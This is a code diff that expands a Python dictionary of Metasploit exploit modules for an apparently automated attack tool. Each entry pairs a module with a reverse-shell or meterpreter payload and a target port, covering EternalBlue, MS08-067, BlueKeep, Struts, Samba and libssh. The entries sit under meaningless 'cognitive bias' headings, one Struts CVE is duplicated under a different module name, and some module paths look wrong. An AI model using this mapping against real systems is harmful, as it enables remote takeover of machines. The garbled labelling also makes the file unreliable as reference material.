@@ -6,22 +6,56 @@ import subprocess
 from pathlib import Path
 from plugins.utils.errors import safe_open
 
-# Exploit modules mapped by cognitive bias
 EXPLOIT_LIBRARY = {
+    # Anchoring Bias Exploits
     "ftp_vsftpd": {
         "module": "exploit/unix/ftp/vsftpd_234_backdoor",
         "payload": "cmd/unix/interact",
         "default_port": 21
+    },
+    "ms08_067": {
+        "module": "exploit/windows/smb/ms08_067_netapi",
+        "payload": "windows/meterpreter/reverse_tcp",
+        "default_port": 445
+    },
+    "cve_2017_0144_eternalblue": {
+        "module": "exploit/windows/smb/ms17_010_eternalblue",
+        "payload": "windows/x64/meterpreter/reverse_tcp",
+        "default_port": 445
+    },
+
+    # Confirmation Bias Exploits
+    "apache_struts": {
+        "module": "exploit/multi/http/struts2_content_type_ognl",
+        "payload": "java/meterpreter/reverse_tcp",
+        "default_port": 8080
     },
     "samba_usermap": {
         "module": "exploit/linux/samba/usermap_script",
         "payload": "cmd/unix/reverse",
         "default_port": 139
     },
-    "apache_struts": {
-        "module": "exploit/multi/http/struts2_content_type_ognl",
+    "cve_2017_5638": {
+        "module": "exploit/multi/http/struts2_code_exec",
         "payload": "java/meterpreter/reverse_tcp",
         "default_port": 8080
+    },
+
+    # Overconfidence Bias Exploits
+    "cve_2021_41773": {
+        "module": "exploit/multi/http/apache_path_traversal",
+        "payload": "cmd/unix/reverse",
+        "default_port": 80
+    },
+    "cve_2018_10933": {
+        "module": "exploit/linux/ssh/libssh_auth_bypass",
+        "payload": "cmd/unix/interact",
+        "default_port": 22
+    },
+    "cve_2019_0708_rdp_bluekeep": {
+        "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+        "payload": "windows/x64/meterpreter/reverse_tcp",
+        "default_port": 3389
     }
 }
 
